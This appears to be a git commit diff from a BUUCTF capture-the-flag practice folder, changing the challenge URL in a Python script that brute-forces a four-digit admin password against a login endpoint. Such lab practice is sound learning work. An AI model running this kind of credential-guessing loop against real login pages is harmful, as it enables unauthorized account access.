82120d4d942f25dabe7be994a4aa7294f20f9c57
龙龙 <51738561+08183080@users.noreply.github.com>
2023-11-16 01:03:53 +0800

    。。。

--- buuctf/brute1.py
+++ buuctf/brute1.py
@@ -9,7 +9,7 @@ import concurrent.futures
 from typing import List, Tuple
 
 def fuzz():
-    url = "http://8dd77020-df68-4430-9fb1-fc4528300a24.node4.buuoj.cn:81?username=admin&password="
+    url = "http://0d345a0d-f773-4be5-ab4b-0adbce1cca25.node4.buuoj.cn:81?username=admin&password="
 
     for i in range(1000, 10000): # 从1000到9999
         res = requests.get(url + str(i))
